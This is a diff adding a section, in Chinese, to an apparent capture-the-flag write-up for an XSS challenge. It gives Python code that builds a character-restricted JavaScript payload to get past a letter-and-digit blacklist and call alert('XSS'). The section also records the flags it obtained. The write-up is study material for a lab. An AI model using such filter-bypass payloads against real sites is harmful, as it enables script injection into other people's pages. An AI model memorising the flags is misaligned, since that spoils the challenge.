@@ -188,3 +188,28 @@ Congratulations!<p> Here is the flag: flag{538aa834-77a6-4641-adcb-098a3928eb68}
    看起来像"报的是字符串里第一个命中项"；但 `test` 里 `t` 在 `e` 之前，
    说明它报的是**黑名单里的顺序**而不是字符串里的顺序。
    这个细节虽小，却印证了"黑名单是个字符表"的判断。
+
+---
+
+## 补充：2026-10-27 本轮的实现与验证
+
+按题解里的生成器重新实现了一遍，唯一改动是**百分号直接以字面量出现**（`%` 不在字母/数字黑名单里），
+数字 5、8、3 仍用 `[]` 在运行时拼出来：
+
+```python
+pieces = [str_alert, '"("', str_unesc, '"("', '"\'"',
+          '"%"', dec(5), dec(8), '"%"', dec(5), dec(3), '"%"', dec(5), dec(3),
+          '"\'"', '")"', '")"']
+code = '(' + '+'.join(pieces) + ')'
+expr = '([])[' + str_filter + '][' + str_ctor + '](' + code + ')()'
+payload = '";' + expr + '//'
+```
+
+生成长度 2 530，字符集检查 `illegal=[]`；用 node 模拟
+`var name = "<payload>"; document.write(...)` 时得到 `ALERT_OK`（参数正好是 `XSS`）。
+
+发给实例（`/page` 的 CSS 是 `xss32.css`）后响应里直接出现
+`flag{dfe721a3-4615-457e-88ab-95ee6d842576}`，平台接受。
+
+**判据**：本地 node 先验证「alert 的参数等于 XSS」，再提交；否则拿到 `Oops! ... instead of "XSS"`
+也不知道是 payload 拼错还是过滤没绕过。
